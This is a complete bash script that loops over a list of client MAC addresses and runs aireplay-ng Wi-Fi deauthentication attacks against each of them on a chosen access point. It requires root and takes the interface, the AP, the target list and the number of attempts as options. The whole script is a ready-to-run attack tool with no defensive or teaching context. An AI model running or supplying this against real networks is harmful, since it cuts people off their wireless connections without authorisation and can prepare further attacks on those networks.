#!/bin/bash

function usage {
	if [[ -z $1 ]]; then 
		echo "Usage: `basename $0` -i iface -a ap -t target_list.txt -n deauth_attempts"
	fi
}

if [[ `id -u` -ne 0 ]]; then
	echo "Must be root"
	exit 0
fi

if [[ -z $1 ]]; then 
	usage
	exit
fi


iface=""
targetlist=""
ap=""
targets=""
number="1"

while getopts "i:t:a:n:" OPT; do 
	case $OPT in 
		i) 
			iface=$OPTARG ;;
		t)
			targetlist=$OPTARG
			targets=`cat $targetlist | awk '{print $2}'` ;;
		a)
			ap=$OPTARG ;;

		n)	number=$OPTARG;;

		*) usage; exit ;; 
	esac
done

for i in $targets; do 
	echo "Attempting to deauthenticate $i..."
	echo "Command: aireplay-ng -0 $number -a $ap -c $i $iface"
	aireplay-ng -0 $number -a $ap -c $i $iface
	echo
	wait
done

